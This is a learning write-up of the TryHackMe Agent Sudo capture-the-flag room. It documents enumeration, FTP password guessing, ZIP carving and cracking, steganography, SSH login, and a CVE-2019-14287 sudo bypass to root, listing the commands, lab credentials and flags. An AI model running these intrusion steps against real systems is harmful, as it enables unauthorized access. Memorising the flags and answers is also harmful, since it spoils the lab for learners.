# TryHackMe Agent Sudo — Lab Walkthrough and Learning Notes

**Lab:** Agent Sudo  
**Platform:** TryHackMe  
**Date completed:** 24 October 2026  
**Environment:** Kali Linux attacker machine; Ubuntu 18.04.3 LTS target  
**Target address used in this session:** `10.49.171.165`  
**Status:** Completed — user-level access and root access obtained

> **Scope and safety:** This document records work performed against the assigned TryHackMe Agent Sudo training target. The commands and techniques below are intended for this authorized lab environment only. Do not apply them to systems without explicit permission.

## 1. Lab overview

On 24 October 2026, I completed the TryHackMe Agent Sudo room. The exercise introduced a practical sequence of enumeration, credential discovery, file carving, password recovery, steganography, SSH access, and Linux privilege escalation. I started with the services exposed by the target, used clues on the web server to identify an FTP account, recovered information hidden inside image files, and used the resulting credentials to connect as the user `james`. From that account, I identified a vulnerable sudo configuration and used CVE-2019-14287 to obtain root access.

The most important lesson from this room was that the clues were connected. The web page directed me toward a particular user-agent string, the FTP message explained that a password was hidden in an image, the ZIP archive revealed a Base64-encoded clue, and the second image contained James's SSH password. The final escalation was possible because the target used an affected sudo version with a restrictive-looking rule that could be bypassed.

## 2. Initial service enumeration

I began by scanning the target to identify reachable services and their versions. The scan showed three open TCP services: FTP on port 21, SSH on port 22, and HTTP on port 80. The FTP service was `vsftpd 3.0.3`, the SSH service was `OpenSSH 7.6p1 Ubuntu`, and the web service was `Apache httpd 2.4.29`.

I used the following command for service and version discovery:

```bash
nmap -sC -sV 10.49.171.165
```

The results suggested several possible entry points. FTP could expose files or accept credentials, SSH could provide remote shell access if I found valid credentials, and HTTP could contain a clue or an application feature worth investigating. I chose to inspect the web service first because its page contained a direct instruction.

## 3. Web-server user-agent clue

The website displayed a message from Agent R instructing visitors to use their own codename as the HTTP user-agent. I tested a likely codename with `curl` and received a redirect to `agent_C_attention.php`. The response contained a message addressed to Chris. It referred to a deal, asked Chris to tell Agent J something quickly, and warned that Chris's password was weak.

I sent the request with this command:

```bash
curl -i -A "C" http://10.49.171.165
```

The server returned an HTTP `302 Found` response with a `Location` header pointing to `agent_C_attention.php`. The page's message indicated that `chris` was a relevant account and that a weak password might be discoverable. This was a useful example of how a small web-server behavior can expose a clue without revealing credentials directly.

## 4. FTP credential discovery and file collection

I tested FTP access and found that anonymous login was rejected. I then used the password-guessing workflow available in the lab to identify the FTP credentials. The successful login used the username `chris` and password `crystal`.

After connecting, I found three files on the FTP server: `To_agentJ.txt`, `cute-alien.jpg`, and `cutie.png`. I downloaded these files for local analysis. The text file was the most useful initial artifact because it explained how the images related to one another.

The FTP message stated that the alien-like pictures were fake and that Agent R had stored the real picture in Agent J's directory. It also said that a login password was stored in a fake picture. This told me to examine the image files for embedded data rather than treating them as ordinary pictures.

## 5. Image inspection and discovery of an embedded ZIP archive

I identified the file types and inspected the image metadata. `cute-alien.jpg` was a JPEG image with dimensions of 440 × 501. `cutie.png` was a 528 × 528 PNG image. The PNG metadata inspection reported trailer data after the PNG `IEND` chunk, which was suspicious because a normal PNG should end at that chunk.

I used `binwalk` to inspect the PNG for embedded content:

```bash
binwalk cutie.png
```

The output identified a ZIP archive beginning at decimal offset `34562` (hexadecimal `0x8702`). The archive contained a file named `To_agentR.txt` and was encrypted. This confirmed that the PNG was being used to conceal a second file after the image data.

I attempted automatic extraction:

```bash
binwalk -e cutie.png
```

Binwalk reported that its external extractor could not run `jar`, but it still carved out the archive as `_cutie.png.extracted/8702.zip`. The extracted directory also contained data associated with the PNG's compressed stream. The missing `jar` executable did not prevent me from continuing because the ZIP archive itself was available.

## 6. Recovering the ZIP password

I converted the encrypted ZIP archive into a hash format that John the Ripper could process. I then used the `rockyou.txt` wordlist to test candidate passwords.

```bash
zip2john _cutie.png.extracted/8702.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
john --show ziphash.txt
```

John recovered the password `alien`. The output showed that one password hash had been cracked. This step demonstrated how a password-protected archive can be assessed offline when the archive is available and a suitable wordlist is provided.

The installed `unzip` utility could not extract the archive because it reported that the archive required PK compatibility version 5.1, which it could not handle. Python's standard `zipfile` module also raised a `NotImplementedError` because the archive used a compression method unsupported by that module in the installed Python version. I then used 7-Zip, which successfully extracted the file.

```bash
7z x _cutie.png.extracted/8702.zip -o_cutie.png.extracted
```

When prompted, I entered the recovered password `alien`. The archive extraction completed successfully, and I read the extracted message:

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

## 7. Decoding the Base64 clue

The string `QXJlYTUx` appeared to be Base64-encoded text. I decoded it with the standard `base64` command:

```bash
echo 'QXJlYTUx' | base64 -d
```

The decoded result was `Area51`. The earlier FTP message had said that the login password was stored in a fake picture, so I treated this decoded value as a possible passphrase for the JPEG image.

## 8. Extracting the hidden message from the JPEG

I used `steghide` to check and extract data hidden in `cute-alien.jpg`. When the tool requested a passphrase, I supplied `Area51`.

```bash
steghide extract -sf cute-alien.jpg
```

The command reported that it had written the extracted data to `message.txt`. I then read the file:

```bash
cat message.txt
```

The hidden message was addressed to James and stated that his login password was `hackerrules!`. It also mentioned that Chris had sent the message. This was the credential clue needed to move from the file-analysis stage to remote access.

## 9. SSH access as James

Using the username and password from the hidden message, I connected to the target over SSH:

```bash
ssh james@10.49.171.165
```

I accepted the SSH host key prompt for the assigned lab target and entered the password `hackerrules!`. The login succeeded, and the target displayed an Ubuntu 18.04.3 LTS banner. I verified the account and working directory:

```bash
whoami
pwd
```

The results were `james` and `/home/james`, respectively. This confirmed that I had obtained a shell as the ordinary user `james`.

## 10. Local enumeration and user flag

I reviewed James's sudo permissions and basic system information. The `sudo -l` output showed that James could run `/bin/bash` as any user except root:

```text
(ALL, !root) /bin/bash
```

I also checked the account's groups and kernel information:

```bash
id
uname -a
sudo --version
```

The account belonged to groups including `sudo` and `adm`. The installed sudo version was `1.8.21p2`, which is affected by CVE-2019-14287. The rule appeared to prevent root execution, but the affected sudo versions mishandled a special user ID in a way that could bypass the restriction.

I inspected James's home directory and located `user_flag.txt`. I read the flag with:

```bash
cat user_flag.txt
```

The user flag recovered during this session was:

```text
b03d975e8c92a7c04146cfa7a5a313c7
```

## 11. Privilege escalation using CVE-2019-14287

The sudo policy allowed James to run `/bin/bash` as users other than root. On vulnerable sudo versions, specifying user ID `-1` (which is treated as an unsigned value in the relevant code path) could cause the requested run-as identity to be interpreted as root while bypassing the `!root` restriction.

I used the following command in the TryHackMe target:

```bash
sudo -u#-1 /bin/bash
```

After the command succeeded, I verified the current identity:

```bash
whoami
```

The output was `root`. This confirmed successful privilege escalation. The vulnerability is identified as **CVE-2019-14287**. The underlying lesson is that access-control rules must be validated against special values and edge cases, not only ordinary usernames and IDs.

## 12. Root flag and completion

After obtaining a root shell, I moved into the root user's home directory and listed its contents:

```bash
cd /root
ls -la
```

The directory contained `root.txt`. I read it with:

```bash
cat root.txt
```

The root flag was:

```text
b53a02f55b57d4439e3341834d70c062
```

The file ended with the attribution `DesKel a.k.a Agent R`, which answered the room's bonus question asking who Agent R was. The bonus answer was `DesKel`.

## 13. Answers and recovered artifacts

The following table summarizes the important results from the lab.

| Item | Finding |
|---|---|
| FTP username | `chris` |
| FTP password | `crystal` |
| Embedded ZIP password | `alien` |
| Base64-decoded passphrase | `Area51` |
| SSH username | `james` |
| SSH password | `hackerrules!` |
| User flag | `b03d975e8c92a7c04146cfa7a5a313c7` |
| Sudo version | `1.8.21p2` |
| Privilege-escalation CVE | `CVE-2019-14287` |
| Root flag | `b53a02f55b57d4439e3341834d70c062` |
| Bonus — Agent R | `DesKel` |
| Photo incident clue | Roswell UFO incident / Roswell Alien Autopsy |

## 14. What I learned

This room helped me practice connecting evidence across different services and file formats. The initial scan identified the available attack surface, while the HTTP user-agent behavior provided a clue about the FTP account. The FTP message guided the image analysis, and the embedded ZIP archive required both file carving and password recovery. The Base64 string then provided a passphrase for steganography, which revealed the SSH credential.

The privilege-escalation stage reinforced the importance of checking sudo permissions and software versions. A policy that appeared to exclude root was not safe on the vulnerable sudo release. By understanding the affected behavior and validating the resulting identity with `whoami`, I confirmed the escalation rather than assuming the command had worked.

For future labs, I want to continue documenting not only the commands I ran, but also why I chose each command, what evidence I observed, and how each finding influenced the next step. That approach makes the notes useful for revisiting the room later and helps turn a completed CTF into repeatable technical learning.

## 15. Key command reference

The commands below summarize the main workflow from this session. They are included as a compact reference after the detailed narrative above.

```bash
nmap -sC -sV 10.49.171.165
curl -i -A "C" http://10.49.171.165
binwalk cutie.png
binwalk -e cutie.png
zip2john _cutie.png.extracted/8702.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
john --show ziphash.txt
7z x _cutie.png.extracted/8702.zip -o_cutie.png.extracted
cat _cutie.png.extracted/To_agentR.txt
echo 'QXJlYTUx' | base64 -d
steghide extract -sf cute-alien.jpg
cat message.txt
ssh james@10.49.171.165
sudo -l
cat user_flag.txt
sudo -u#-1 /bin/bash
whoami
cd /root
cat root.txt
```

**Completion date:** 24 October 2026  
**Final result:** I obtained both the user flag and root flag and completed the Agent Sudo room.
